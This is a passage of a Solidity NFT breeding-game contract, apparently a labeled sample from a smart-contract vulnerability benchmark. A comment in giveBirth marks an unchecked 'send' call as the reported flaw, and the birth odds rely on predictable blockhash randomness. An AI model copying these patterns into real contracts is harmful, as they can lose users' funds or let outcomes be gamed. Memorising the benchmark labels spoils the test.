sales as well as the gen0 sales which are\n    ///  initiated every 15 minutes.\n    SaleClockAuction public saleAuction;\n\n    /// @dev The address of a custom ClockAuction subclassed contract that handles siring\n    ///  auctions. Needs to be separate from saleAuction because the actions taken on success\n    ///  after a sales and siring auction are quite different.\n    SiringClockAuction public siringAuction;\n\n\n    /// @dev The address of the sibling contract that is used to implement the sooper-sekret\n    ///  genetic combination algorithm.\n    GeneScienceInterface public geneScience;\n\n\n    SaleClockAuctionERC20 public saleAuctionERC20;\n\n\n    // wizz panda total\n    mapping (uint256 => uint256) public wizzPandaQuota;\n    mapping (uint256 => uint256) public wizzPandaCount;\n\n    \n    /// wizz panda control\n    function getWizzPandaQuotaOf(uint256 _tp) view external returns(uint256) {\n        return wizzPandaQuota[_tp];\n    }\n\n    function getWizzPandaCountOf(uint256 _tp) view external returns(uint256) {\n        return wizzPandaCount[_tp];\n    }\n\n    function setTotalWizzPandaOf(uint256 _tp,uint256 _total) external onlyCLevel {\n        require (wizzPandaQuota[_tp]==0);\n        require (_total==uint256(uint32(_total)));\n        wizzPandaQuota[_tp] = _total;\n    }\n\n    function getWizzTypeOf(uint256 _id) view external returns(uint256) {\n        Panda memory _p = pandas[_id];\n        return geneScience.getWizzType(_p.genes);\n    }\n\n    /// @dev Assigns ownership of a specific Panda to an address.\n    function _transfer(address _from, address _to, uint256 _tokenId) internal {\n        // Since the number of kittens is capped to 2^32 we can't overflow this\n        ownershipTokenCount[_to]++;\n        // transfer ownership\n        pandaIndexToOwner[_tokenId] = _to;\n        // When creating new kittens _from is 0x0, but we can't account that address.\n        if (_from != address(0)) {\n            ownershipTokenCount[_from]--;\n            // once the kitten is transferred also clear sire allowances\n            delete sireAllowedToAddress[_tokenId];\n            // clear any previously approved ownership exchange\n            delete pandaIndexToApproved[_tokenId];\n        }\n        // Emit the transfer event.\n        Transfer(_from, _to, _tokenId);\n    }\n\n    /// @dev An internal method that creates a new panda and stores it. This\n    ///  method doesn't do any checking and should only be called when the\n    ///  input data is known to be valid. Will generate both a Birth event\n    ///  and a Transfer event.\n    /// @param _matronId The panda ID of the matron of this cat (zero for gen0)\n    /// @param _sireId The panda ID of the sire of this cat (zero for gen0)\n    /// @param _generation The generation number of this cat, must be computed by caller.\n    /// @param _genes The panda's genetic code.\n    /// @param _owner The inital owner of this cat, must be non-zero (except for the unPanda, ID 0)\n    function _createPanda(\n        uint256 _matronId,\n        uint256 _sireId,\n        uint256 _generation,\n        uint256[2] _genes,\n        address _owner\n    )\n        internal\n        returns (uint)\n    {\n        // These requires are not strictly necessary, our calling code should make\n        // sure that these conditions are never broken. However! _createPanda() is already\n        // an expensive call (for storage), and it doesn't hurt to be especially careful\n        // to ensure our data structures are always valid.\n        require(_matronId == uint256(uint32(_matronId)));\n        require(_sireId == uint256(uint32(_sireId)));\n        require(_generation == uint256(uint16(_generation)));\n\n\n        // New panda starts with the same cooldown as parent gen/2\n        uint16 cooldownIndex = 0;\n        // when contract creation, geneScience ref is null \n        if (pandas.length>0){\n            uint16 pureDegree = uint16(geneScience.getPureFromGene(_genes));\n            if (pureDegree==0) {\n                pureDegree = 1;\n            }\n            cooldownIndex = 1000/pureDegree;\n            if (cooldownIndex%10 < 5){\n                cooldownIndex = cooldownIndex/10;\n            }else{\n                cooldownIndex = cooldownIndex/10 + 1;\n            }\n            cooldownIndex = cooldownIndex - 1;\n            if (cooldownIndex > 8) {\n                cooldownIndex = 8;\n            }\n            uint256 _tp = geneScience.getWizzType(_genes);\n            if (_tp>0 && wizzPandaQuota[_tp]<=wizzPandaCount[_tp]) {\n                _genes = geneScience.clearWizzType(_genes);\n                _tp = 0;\n            }\n            // gensis panda cooldownIndex should be 24 hours\n            if (_tp == 1){\n                cooldownIndex = 5;\n            }\n\n            // increase wizz counter\n            if (_tp>0){\n                wizzPandaCount[_tp] = wizzPandaCount[_tp] + 1;\n            }\n            // all gen0&gen1 except gensis\n            if (_generation <= 1 && _tp != 1){\n                require(gen0CreatedCount<GEN0_TOTAL_COUNT);\n                gen0CreatedCount++;\n            }\n        }\n\n        Panda memory _panda = Panda({\n            genes: _genes,\n            birthTime: uint64(now),\n            cooldownEndBlock: 0,\n            matronId: uint32(_matronId),\n            sireId: uint32(_sireId),\n            siringWithId: 0,\n            cooldownIndex: cooldownIndex,\n            generation: uint16(_generation)\n        });\n        uint256 newKittenId = pandas.push(_panda) - 1;\n\n        // It's probably never going to happen, 4 billion cats is A LOT, but\n        // let's just be 100% sure we never let this happen.\n        require(newKittenId == uint256(uint32(newKittenId)));\n\n        // emit the birth event\n        Birth(\n            _owner,\n            newKittenId,\n            uint256(_panda.matronId),\n            uint256(_panda.sireId),\n            _panda.genes\n        );\n\n        // This will assign ownership, and also emit the Transfer event as\n        // per ERC721 draft\n        _transfer(0, _owner, newKittenId);\n        \n        return newKittenId;\n    }\n\n    // Any C-level can fix how many seconds per blocks are currently observed.\n    function setSecondsPerBlock(uint256 secs) external onlyCLevel {\n        require(secs < cooldowns[0]);\n        secondsPerBlock = secs;\n    }\n}\n/// @title The external contract that is responsible for generating metadata for the pandas,\n///  it has one function that will return the data as bytes.\ncontract ERC721Metadata {\n    /// @dev Given a token Id, returns a byte array that is supposed to be converted into string.\n    function getMetadata(uint256 _tokenId, string) public view returns (bytes32[4] buffer, uint256 count) {\n        if (_tokenId == 1) {\n            buffer[0] = \"Hello World! :D\";\n            count = 15;\n        } else if (_tokenId == 2) {\n            buffer[0] = \"I would definitely choose a medi\";\n            buffer[1] = \"um length string.\";\n            count = 49;\n        } else if (_tokenId == 3) {\n            buffer[0] = \"Lorem ipsum dolor sit amet, mi e\";\n            buffer[1] = \"st accumsan dapibus augue lorem,\";\n            buffer[2] = \" tristique vestibulum id, libero\";\n            buffer[3] = \" suscipit varius sapien aliquam.\";\n            count = 128;\n        }\n    }\n}\n\n\n\n\n\n\n\n/// @title The facet of the CryptoPandas core contract that manages ownership, ERC-721 (draft) compliant.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev Ref: https://github.com/ethereum/EIPs/issues/721\n///  See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaOwnership is PandaBase, ERC721 {\n\n    /// @notice Name and symbol of the non fungible token, as defined in ERC721.\n    string public constant name = \"PandaEarth\";\n    string public constant symbol = \"PE\";\n\n    bytes4 constant InterfaceSignature_ERC165 =\n        bytes4(keccak256('supportsInterface(bytes4)'));\n\n    bytes4 constant InterfaceSignature_ERC721 =\n        bytes4(keccak256('name()')) ^\n        bytes4(keccak256('symbol()')) ^\n        bytes4(keccak256('totalSupply()')) ^\n        bytes4(keccak256('balanceOf(address)')) ^\n        bytes4(keccak256('ownerOf(uint256)')) ^\n        bytes4(keccak256('approve(address,uint256)')) ^\n        bytes4(keccak256('transfer(address,uint256)')) ^\n        bytes4(keccak256('transferFrom(address,address,uint256)')) ^\n        bytes4(keccak256('tokensOfOwner(address)')) ^\n        bytes4(keccak256('tokenMetadata(uint256,string)'));\n\n    /// @notice Introspection interface as per ERC-165 (https://github.com/ethereum/EIPs/issues/165).\n    ///  Returns true for any standardized interfaces implemented by this contract. We implement\n    ///  ERC-165 (obviously!) and ERC-721.\n    function supportsInterface(bytes4 _interfaceID) external view returns (bool)\n    {\n        // DEBUG ONLY\n        //require((InterfaceSignature_ERC165 == 0x01ffc9a7) && (InterfaceSignature_ERC721 == 0x9a20483d));\n\n        return ((_interfaceID == InterfaceSignature_ERC165) || (_interfaceID == InterfaceSignature_ERC721));\n    }\n\n    // Internal utility functions: These functions all assume that their input arguments\n    // are valid. We leave it to public methods to sanitize their inputs and follow\n    // the required logic.\n\n    /// @dev Checks if a given address is the current owner of a particular Panda.\n    /// @param _claimant the address we are validating against.\n    /// @param _tokenId kitten id, only valid when > 0\n    function _owns(address _claimant, uint256 _tokenId) internal view returns (bool) {\n        return pandaIndexToOwner[_tokenId] == _claimant;\n    }\n\n    /// @dev Checks if a given address currently has transferApproval for a particular Panda.\n    /// @param _claimant the address we are confirming kitten is approved for.\n    /// @param _tokenId kitten id, only valid when > 0\n    function _approvedFor(address _claimant, uint256 _tokenId) internal view returns (bool) {\n        return pandaIndexToApproved[_tokenId] == _claimant;\n    }\n\n    /// @dev Marks an address as being approved for transferFrom(), overwriting any previous\n    ///  approval. Setting _approved to address(0) clears all transfer approval.\n    ///  NOTE: _approve() does NOT send the Approval event. This is intentional because\n    ///  _approve() and transferFrom() are used together for putting Pandas on auction, and\n    ///  there is no value in spamming the log with Approval events in that case.\n    function _approve(uint256 _tokenId, address _approved) internal {\n        pandaIndexToApproved[_tokenId] = _approved;\n    }\n\n    /// @notice Returns the number of Pandas owned by a specific address.\n    /// @param _owner The owner address to check.\n    /// @dev Required for ERC-721 compliance\n    function balanceOf(address _owner) public view returns (uint256 count) {\n        return ownershipTokenCount[_owner];\n    }\n\n    /// @notice Transfers a Panda to another address. If transferring to a smart\n    ///  contract be VERY CAREFUL to ensure that it is aware of ERC-721 (or\n    ///  CryptoPandas specifically) or your Panda may be lost forever. Seriously.\n    /// @param _to The address of the recipient, can be a user or contract.\n    /// @param _tokenId The ID of the Panda to transfer.\n    /// @dev Required for ERC-721 compliance.\n    function transfer(\n        address _to,\n        uint256 _tokenId\n    )\n        external\n        whenNotPaused\n    {\n        // Safety check to prevent against an unexpected 0x0 default.\n        require(_to != address(0));\n        // Disallow transfers to this contract to prevent accidental misuse.\n        // The contract should never own any pandas (except very briefly\n        // after a gen0 cat is created and before it goes on auction).\n        require(_to != address(this));\n        // Disallow transfers to the auction contracts to prevent accidental\n        // misuse. Auction contracts should only take ownership of pandas\n        // through the allow + transferFrom flow.\n        require(_to != address(saleAuction));\n        require(_to != address(siringAuction));\n\n        // You can only send your own cat.\n        require(_owns(msg.sender, _tokenId));\n\n        // Reassign ownership, clear pending approvals, emit Transfer event.\n        _transfer(msg.sender, _to, _tokenId);\n    }\n\n    /// @notice Grant another address the right to transfer a specific Panda via\n    ///  transferFrom(). This is the preferred flow for transfering NFTs to contracts.\n    /// @param _to The address to be granted transfer approval. Pass address(0) to\n    ///  clear all approvals.\n    /// @param _tokenId The ID of the Panda that can be transferred if this call succeeds.\n    /// @dev Required for ERC-721 compliance.\n    function approve(\n        address _to,\n        uint256 _tokenId\n    )\n        external\n        whenNotPaused\n    {\n        // Only an owner can grant transfer approval.\n        require(_owns(msg.sender, _tokenId));\n\n        // Register the approval (replacing any previous approval).\n        _approve(_tokenId, _to);\n\n        // Emit approval event.\n        Approval(msg.sender, _to, _tokenId);\n    }\n\n    /// @notice Transfer a Panda owned by another address, for which the calling address\n    ///  has previously been granted transfer approval by the owner.\n    /// @param _from The address that owns the Panda to be transfered.\n    /// @param _to The address that should take ownership of the Panda. Can be any address,\n    ///  including the caller.\n    /// @param _tokenId The ID of the Panda to be transferred.\n    /// @dev Required for ERC-721 compliance.\n    function transferFrom(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    )\n        external\n        whenNotPaused\n    {\n        // Safety check to prevent against an unexpected 0x0 default.\n        require(_to != address(0));\n        // Disallow transfers to this contract to prevent accidental misuse.\n        // The contract should never own any pandas (except very briefly\n        // after a gen0 cat is created and before it goes on auction).\n        require(_to != address(this));\n        // Check for approval and valid ownership\n        require(_approvedFor(msg.sender, _tokenId));\n        require(_owns(_from, _tokenId));\n\n        // Reassign ownership (also clears pending approvals and emits Transfer event).\n        _transfer(_from, _to, _tokenId);\n    }\n\n    /// @notice Returns the total number of Pandas currently in existence.\n    /// @dev Required for ERC-721 compliance.\n    function totalSupply() public view returns (uint) {\n        return pandas.length - 1;\n    }\n\n    /// @notice Returns the address currently assigned ownership of a given Panda.\n    /// @dev Required for ERC-721 compliance.\n    function ownerOf(uint256 _tokenId)\n        external\n        view\n        returns (address owner)\n    {\n        owner = pandaIndexToOwner[_tokenId];\n\n        require(owner != address(0));\n    }\n\n    /// @notice Returns a list of all Panda IDs assigned to an address.\n    /// @param _owner The owner whose Pandas we are interested in.\n    /// @dev This method MUST NEVER be called by smart contract code. First, it's fairly\n    ///  expensive (it walks the entire Panda array looking for cats belonging to owner),\n    ///  but it also returns a dynamic array, which is only supported for web3 calls, and\n    ///  not contract-to-contract calls.\n    function tokensOfOwner(address _owner) external view returns(uint256[] ownerTokens) {\n        uint256 tokenCount = balanceOf(_owner);\n\n        if (tokenCount == 0) {\n            // Return an empty array\n            return new uint256[](0);\n        } else {\n            uint256[] memory result = new uint256[](tokenCount);\n            uint256 totalCats = totalSupply();\n            uint256 resultIndex = 0;\n\n            // We count on the fact that all cats have IDs starting at 1 and increasing\n            // sequentially up to the totalCat count.\n            uint256 catId;\n\n            for (catId = 1; catId <= totalCats; catId++) {\n                if (pandaIndexToOwner[catId] == _owner) {\n                    result[resultIndex] = catId;\n                    resultIndex++;\n                }\n            }\n\n            return result;\n        }\n    }\n\n    /// @dev Adapted from memcpy() by @arachnid (Nick Johnson <arachnid@notdot.net>)\n    ///  This method is licenced under the Apache License.\n    ///  Ref: https://github.com/Arachnid/solidity-stringutils/blob/2f6ca9accb48ae14c66f1437ec50ed19a0616f78/strings.sol\n    function _memcpy(uint _dest, uint _src, uint _len) private view {\n        // Copy word-length chunks while possible\n        for(; _len >= 32; _len -= 32) {\n            assembly {\n                mstore(_dest, mload(_src))\n            }\n            _dest += 32;\n            _src += 32;\n        }\n\n        // Copy remaining bytes\n        uint256 mask = 256 ** (32 - _len) - 1;\n        assembly {\n            let srcpart := and(mload(_src), not(mask))\n            let destpart := and(mload(_dest), mask)\n            mstore(_dest, or(destpart, srcpart))\n        }\n    }\n\n    /// @dev Adapted from toString(slice) by @arachnid (Nick Johnson <arachnid@notdot.net>)\n    ///  This method is licenced under the Apache License.\n    ///  Ref: https://github.com/Arachnid/solidity-stringutils/blob/2f6ca9accb48ae14c66f1437ec50ed19a0616f78/strings.sol\n    function _toString(bytes32[4] _rawBytes, uint256 _stringLength) private view returns (string) {\n        var outputString = new string(_stringLength);\n        uint256 outputPtr;\n        uint256 bytesPtr;\n\n        assembly {\n            outputPtr := add(outputString, 32)\n            bytesPtr := _rawBytes\n        }\n\n        _memcpy(outputPtr, bytesPtr, _stringLength);\n\n        return outputString;\n    }\n\n}\n\n\n\n\n/// @title A facet of PandaCore that manages Panda siring, gestation, and birth.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaBreeding is PandaOwnership {\n\n    uint256 public constant GENSIS_TOTAL_COUNT = 100;\n\n    /// @dev The Pregnant event is fired when two cats successfully breed and the pregnancy\n    ///  timer begins for the matron.\n    event Pregnant(address owner, uint256 matronId, uint256 sireId, uint256 cooldownEndBlock);\n    /// @dev The Abortion event is fired when two cats breed failed.\n    event Abortion(address owner, uint256 matronId, uint256 sireId);\n\n    /// @notice The minimum payment required to use breedWithAuto(). This fee goes towards\n    ///  the gas cost paid by whatever calls giveBirth(), and can be dynamically updated by\n    ///  the COO role as the gas price changes.\n    uint256 public autoBirthFee = 2 finney;\n\n    // Keeps track of number of pregnant pandas.\n    uint256 public pregnantPandas;\n\n    mapping(uint256 => address) childOwner;\n\n\n    /// @dev Update the address of the genetic contract, can only be called by the CEO.\n    /// @param _address An address of a GeneScience contract instance to be used from this point forward.\n    function setGeneScienceAddress(address _address) external onlyCEO {\n        GeneScienceInterface candidateContract = GeneScienceInterface(_address);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(candidateContract.isGeneScience());\n\n        // Set the new contract address\n        geneScience = candidateContract;\n    }\n\n    /// @dev Checks that a given kitten is able to breed. Requires that the\n    ///  current cooldown is finished (for sires) and also checks that there is\n    ///  no pending pregnancy.\n    function _isReadyToBreed(Panda _kit) internal view returns(bool) {\n        // In addition to checking the cooldownEndBlock, we also need to check to see if\n        // the cat has a pending birth; there can be some period of time between the end\n        // of the pregnacy timer and the birth event.\n        return (_kit.siringWithId == 0) && (_kit.cooldownEndBlock <= uint64(block.number));\n    }\n\n    /// @dev Check if a sire has authorized breeding with this matron. True if both sire\n    ///  and matron have the same owner, or if the sire has given siring permission to\n    ///  the matron's owner (via approveSiring()).\n    function _isSiringPermitted(uint256 _sireId, uint256 _matronId) internal view returns(bool) {\n        address matronOwner = pandaIndexToOwner[_matronId];\n        address sireOwner = pandaIndexToOwner[_sireId];\n\n        // Siring is okay if they have same owner, or if the matron's owner was given\n        // permission to breed with this sire.\n        return (matronOwner == sireOwner || sireAllowedToAddress[_sireId] == matronOwner);\n    }\n\n    /// @dev Set the cooldownEndTime for the given Panda, based on its current cooldownIndex.\n    ///  Also increments the cooldownIndex (unless it has hit the cap).\n    /// @param _kitten A reference to the Panda in storage which needs its timer started.\n    function _triggerCooldown(Panda storage _kitten) internal {\n        // Compute an estimation of the cooldown time in blocks (based on current cooldownIndex).\n        _kitten.cooldownEndBlock = uint64((cooldowns[_kitten.cooldownIndex] / secondsPerBlock) + block.number);\n\n\n        // Increment the breeding count, clamping it at 13, which is the length of the\n        // cooldowns array. We could check the array size dynamically, but hard-coding\n        // this as a constant saves gas. Yay, Solidity!\n        if (_kitten.cooldownIndex < 8 && geneScience.getWizzType(_kitten.genes) != 1) {\n            _kitten.cooldownIndex += 1;\n        }\n    }\n\n    /// @notice Grants approval to another user to sire with one of your Pandas.\n    /// @param _addr The address that will be able to sire with your Panda. Set to\n    ///  address(0) to clear all siring approvals for this Panda.\n    /// @param _sireId A Panda that you own that _addr will now be able to sire with.\n    function approveSiring(address _addr, uint256 _sireId)\n    external\n    whenNotPaused {\n        require(_owns(msg.sender, _sireId));\n        sireAllowedToAddress[_sireId] = _addr;\n    }\n\n    /// @dev Updates the minimum payment required for calling giveBirthAuto(). Can only\n    ///  be called by the COO address. (This fee is used to offset the gas cost incurred\n    ///  by the autobirth daemon).\n    function setAutoBirthFee(uint256 val) external onlyCOO {\n        autoBirthFee = val;\n    }\n\n    /// @dev Checks to see if a given Panda is pregnant and (if so) if the gestation\n    ///  period has passed.\n    function _isReadyToGiveBirth(Panda _matron) private view returns(bool) {\n        return (_matron.siringWithId != 0) && (_matron.cooldownEndBlock <= uint64(block.number));\n    }\n\n    /// @notice Checks that a given kitten is able to breed (i.e. it is not pregnant or\n    ///  in the middle of a siring cooldown).\n    /// @param _pandaId reference the id of the kitten, any user can inquire about it\n    function isReadyToBreed(uint256 _pandaId)\n    public\n    view\n    returns(bool) {\n        require(_pandaId > 0);\n        Panda storage kit = pandas[_pandaId];\n        return _isReadyToBreed(kit);\n    }\n\n    /// @dev Checks whether a panda is currently pregnant.\n    /// @param _pandaId reference the id of the kitten, any user can inquire about it\n    function isPregnant(uint256 _pandaId)\n    public\n    view\n    returns(bool) {\n        require(_pandaId > 0);\n        // A panda is pregnant if and only if this field is set\n        return pandas[_pandaId].siringWithId != 0;\n    }\n\n    /// @dev Internal check to see if a given sire and matron are a valid mating pair. DOES NOT\n    ///  check ownership permissions (that is up to the caller).\n    /// @param _matron A reference to the Panda struct of the potential matron.\n    /// @param _matronId The matron's ID.\n    /// @param _sire A reference to the Panda struct of the potential sire.\n    /// @param _sireId The sire's ID\n    function _isValidMatingPair(\n        Panda storage _matron,\n        uint256 _matronId,\n        Panda storage _sire,\n        uint256 _sireId\n    )\n    private\n    view\n    returns(bool) {\n        // A Panda can't breed with itself!\n        if (_matronId == _sireId) {\n            return false;\n        }\n\n        // Pandas can't breed with their parents.\n        if (_matron.matronId == _sireId || _matron.sireId == _sireId) {\n            return false;\n        }\n        if (_sire.matronId == _matronId || _sire.sireId == _matronId) {\n            return false;\n        }\n\n        // We can short circuit the sibling check (below) if either cat is\n        // gen zero (has a matron ID of zero).\n        if (_sire.matronId == 0 || _matron.matronId == 0) {\n            return true;\n        }\n\n        // Pandas can't breed with full or half siblings.\n        if (_sire.matronId == _matron.matronId || _sire.matronId == _matron.sireId) {\n            return false;\n        }\n        if (_sire.sireId == _matron.matronId || _sire.sireId == _matron.sireId) {\n            return false;\n        }\n\n        // male should get breed with female\n        if (geneScience.getSex(_matron.genes) + geneScience.getSex(_sire.genes) != 1) {\n            return false;\n        }\n\n        // Everything seems cool! Let's get DTF.\n        return true;\n    }\n\n    /// @dev Internal check to see if a given sire and matron are a valid mating pair for\n    ///  breeding via auction (i.e. skips ownership and siring approval checks).\n    function _canBreedWithViaAuction(uint256 _matronId, uint256 _sireId)\n    internal\n    view\n    returns(bool) {\n        Panda storage matron = pandas[_matronId];\n        Panda storage sire = pandas[_sireId];\n        return _isValidMatingPair(matron, _matronId, sire, _sireId);\n    }\n\n    /// @notice Checks to see if two cats can breed together, including checks for\n    ///  ownership and siring approvals. Does NOT check that both cats are ready for\n    ///  breeding (i.e. breedWith could still fail until the cooldowns are finished).\n    ///  TODO: Shouldn't this check pregnancy and cooldowns?!?\n    /// @param _matronId The ID of the proposed matron.\n    /// @param _sireId The ID of the proposed sire.\n    function canBreedWith(uint256 _matronId, uint256 _sireId)\n    external\n    view\n    returns(bool) {\n        require(_matronId > 0);\n        require(_sireId > 0);\n        Panda storage matron = pandas[_matronId];\n        Panda storage sire = pandas[_sireId];\n        return _isValidMatingPair(matron, _matronId, sire, _sireId) &&\n            _isSiringPermitted(_sireId, _matronId);\n    }\n\n    function _exchangeMatronSireId(uint256 _matronId, uint256 _sireId) internal returns(uint256, uint256) {\n        if (geneScience.getSex(pandas[_matronId].genes) == 1) {\n            return (_sireId, _matronId);\n        } else {\n            return (_matronId, _sireId);\n        }\n    }\n\n    /// @dev Internal utility function to initiate breeding, assumes that all breeding\n    ///  requirements have been checked.\n    function _breedWith(uint256 _matronId, uint256 _sireId, address _owner) internal {\n        // make id point real gender\n        (_matronId, _sireId) = _exchangeMatronSireId(_matronId, _sireId);\n        // Grab a reference to the Pandas from storage.\n        Panda storage sire = pandas[_sireId];\n        Panda storage matron = pandas[_matronId];\n\n        // Mark the matron as pregnant, keeping track of who the sire is.\n        matron.siringWithId = uint32(_sireId);\n\n        // Trigger the cooldown for both parents.\n        _triggerCooldown(sire);\n        _triggerCooldown(matron);\n\n        // Clear siring permission for both parents. This may not be strictly necessary\n        // but it's likely to avoid confusion!\n        delete sireAllowedToAddress[_matronId];\n        delete sireAllowedToAddress[_sireId];\n\n        // Every time a panda gets pregnant, counter is incremented.\n        pregnantPandas++;\n\n        childOwner[_matronId] = _owner;\n\n        // Emit the pregnancy event.\n        Pregnant(pandaIndexToOwner[_matronId], _matronId, _sireId, matron.cooldownEndBlock);\n    }\n\n    /// @notice Breed a Panda you own (as matron) with a sire that you own, or for which you\n    ///  have previously been given Siring approval. Will either make your cat pregnant, or will\n    ///  fail entirely. Requires a pre-payment of the fee given out to the first caller of giveBirth()\n    /// @param _matronId The ID of the Panda acting as matron (will end up pregnant if successful)\n    /// @param _sireId The ID of the Panda acting as sire (will begin its siring cooldown if successful)\n    function breedWithAuto(uint256 _matronId, uint256 _sireId)\n    external\n    payable\n    whenNotPaused {\n        // Checks for payment.\n        require(msg.value >= autoBirthFee);\n\n        // Caller must own the matron.\n        require(_owns(msg.sender, _matronId));\n\n        // Neither sire nor matron are allowed to be on auction during a normal\n        // breeding operation, but we don't need to check that explicitly.\n        // For matron: The caller of this function can't be the owner of the matron\n        //   because the owner of a Panda on auction is the auction house, and the\n        //   auction house will never call breedWith().\n        // For sire: Similarly, a sire on auction will be owned by the auction house\n        //   and the act of transferring ownership will have cleared any oustanding\n        //   siring approval.\n        // Thus we don't need to spend gas explicitly checking to see if either cat\n        // is on auction.\n\n        // Check that matron and sire are both owned by caller, or that the sire\n        // has given siring permission to caller (i.e. matron's owner).\n        // Will fail for _sireId = 0\n        require(_isSiringPermitted(_sireId, _matronId));\n\n        // Grab a reference to the potential matron\n        Panda storage matron = pandas[_matronId];\n\n        // Make sure matron isn't pregnant, or in the middle of a siring cooldown\n        require(_isReadyToBreed(matron));\n\n        // Grab a reference to the potential sire\n        Panda storage sire = pandas[_sireId];\n\n        // Make sure sire isn't pregnant, or in the middle of a siring cooldown\n        require(_isReadyToBreed(sire));\n\n        // Test that these cats are a valid mating pair.\n        require(_isValidMatingPair(\n            matron,\n            _matronId,\n            sire,\n            _sireId\n        ));\n\n        // All checks passed, panda gets pregnant!\n        _breedWith(_matronId, _sireId, msg.sender);\n    }\n\n    /// @notice Have a pregnant Panda give birth!\n    /// @param _matronId A Panda ready to give birth.\n    /// @return The Panda ID of the new kitten.\n    /// @dev Looks at a given Panda and, if pregnant and if the gestation period has passed,\n    ///  combines the genes of the two parents to create a new kitten. The new Panda is assigned\n    ///  to the current owner of the matron. Upon successful completion, both the matron and the\n    ///  new kitten will be ready to breed again. Note that anyone can call this function (if they\n    ///  are willing to pay the gas!), but the new kitten always goes to the mother's owner.\n    function giveBirth(uint256 _matronId, uint256[2] _childGenes, uint256[2] _factors)\n    external\n    whenNotPaused\n    onlyCLevel\n    returns(uint256) {\n        // Grab a reference to the matron in storage.\n        Panda storage matron = pandas[_matronId];\n\n        // Check that the matron is a valid cat.\n        require(matron.birthTime != 0);\n\n        // Check that the matron is pregnant, and that its time has come!\n        require(_isReadyToGiveBirth(matron));\n\n        // Grab a reference to the sire in storage.\n        uint256 sireId = matron.siringWithId;\n        Panda storage sire = pandas[sireId];\n\n        // Determine the higher generation number of the two parents\n        uint16 parentGen = matron.generation;\n        if (sire.generation > matron.generation) {\n            parentGen = sire.generation;\n        }\n\n        // Call the sooper-sekret gene mixing operation.\n        //uint256[2] memory childGenes = geneScience.mixGenes(matron.genes, sire.genes,matron.generation,sire.generation, matron.cooldownEndBlock - 1);\n        uint256[2] memory childGenes = _childGenes;\n\n        uint256 kittenId = 0;\n\n        // birth failed\n        uint256 probability = (geneScience.getPureFromGene(matron.genes) + geneScience.getPureFromGene(sire.genes)) / 2 + _factors[0];\n        if (probability >= (parentGen + 1) * _factors[1]) {\n            probability = probability - (parentGen + 1) * _factors[1];\n        } else {\n            probability = 0;\n        }\n        if (parentGen == 0 && gen0CreatedCount == GEN0_TOTAL_COUNT) {\n            probability = 0;\n        }\n        if (uint256(keccak256(block.blockhash(block.number - 2), now)) % 100 < probability) {\n            // Make the new kitten!\n            address owner = childOwner[_matronId];\n            kittenId = _createPanda(_matronId, matron.siringWithId, parentGen + 1, childGenes, owner);\n        } else {\n            Abortion(pandaIndexToOwner[_matronId], _matronId, sireId);\n        }\n        // Make the new kitten!\n        //address owner = pandaIndexToOwner[_matronId];\n        //address owner = childOwner[_matronId];\n        //uint256 kittenId = _createPanda(_matronId, matron.siringWithId, parentGen + 1, childGenes, owner);\n\n        // Clear the reference to sire from the matron (REQUIRED! Having siringWithId\n        // set is what marks a matron as being pregnant.)\n        delete matron.siringWithId;\n\n        // Every time a panda gives birth counter is decremented.\n        pregnantPandas--;\n\n        // Send the balance fee to the person who made birth happen.\n         // <yes> <report> UNCHECKED_LL_CALLS\n        msg.sender.send(autoBirthFee);\n\n        delete childOwner[_matronId];\n\n        // return the new kitten's ID\n        return kittenId;\n    }\n}\n\n\n\n\n\n/// @title Auction Core\n/// @dev Contains models, variables, and internal methods for the auction.\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract ClockAuctionBase {\n\n    // Represents an auction on an NFT\n    struct Auction {\n        // Current owner of NFT\n        address seller;\n        // Price (in wei) at beginning of auction\n        uint128 startingPrice;\n        // Price (in wei) at end of auction\n        uint128 endingPrice;\n        // Duration (in seconds) of auction\n        uint64 duration;\n        // Time when auction started\n        // NOTE: 0 if this auction has been concluded\n        uint64 startedAt;\n        // is this auction for gen0 panda\n        uint64 isGen0;\n    }\n\n    // Reference to contract tracking NFT ownership\n    ERC721 public nonFungibleContract;\n\n    // Cut owner takes on each auction, measured in basis points (1/100 of a percent).\n    // Values 0-10,000 map to 0%-100%\n    uint256 public ownerCut;\n\n    // Map from token ID to their corresponding auction.\n    mapping (uint256 => Auction) tokenIdToAuction;\n\n    event AuctionCreated(uint256 tokenId, uint256 startingPrice, uint256 endingPrice, uint256 duration);\n    event AuctionSuccessful(uint256 tokenId, uint256 totalPrice, address winner);\n    event AuctionCancelled(uint256 tokenId);\n\n    /// @dev Returns true if the claimant owns the token.\n    /// @param _claimant - Address claiming to own the token.\n    /// @param _tokenId - ID of token whose ownership to verify.\n    function _owns(address _claimant, uint256 _tokenId) internal view returns (bool) {\n        return (nonFungibleContract.ownerOf(_tokenId) == _claimant);\n    }\n\n    /// @dev Escrows the NFT, assigning ownership to this contract.\n    /// Throws if the escrow fails.\n    /// @param _owner - Current owner address of token to escrow.\n    /// @param _tokenId - ID of token whose approval to verify.\n    function _escrow(address _owner, uint256 _tokenId) internal {\n        // it will throw if transfer fails\n        nonFungibleContract.transferFrom(_owner, this, _tokenId);\n    }\n\n    /// @dev Transfers an NFT owned by this contract to another address.\n    /// Returns true if the transfer succeeds.\n    /// @param _receiver - Address to transfer NFT to.\n    /// @param _tokenId - ID of token to transfer.\n    function _transfer(address _receiver, uint256 _tokenId) internal {\n        // it will throw if transfer fails\n        nonFungibleContract.transfer(_receiver, _tokenId);\n    }\n\n    /// @dev Adds an auction to the list of open auctions. Also fires the\n    ///  AuctionCreated event.\n    /// @param _tokenId The ID of the token to be put on auction.\n    /// @param _auction Auction to add.\n    function _addAuction(uint256 _tokenId, Auction _auction) internal {\n        // Require that all auctions have a duration of\n        // at least one minute. (Keeps our math from getting hairy!)\n        require(_auction.duration >= 1 minutes);\n\n        tokenIdToAuction[_tokenId] = _auction;\n\n        AuctionCreated(\n            uint256(_tokenId),\n            uint256(_auction.startingPrice),\n            uint256(_auction.endingPrice),\n            uint256(_auction.duration)\n        );\n    } \n\n    /// @dev Cancels an auction unconditionally.\n    function _cancelAuction(uint256 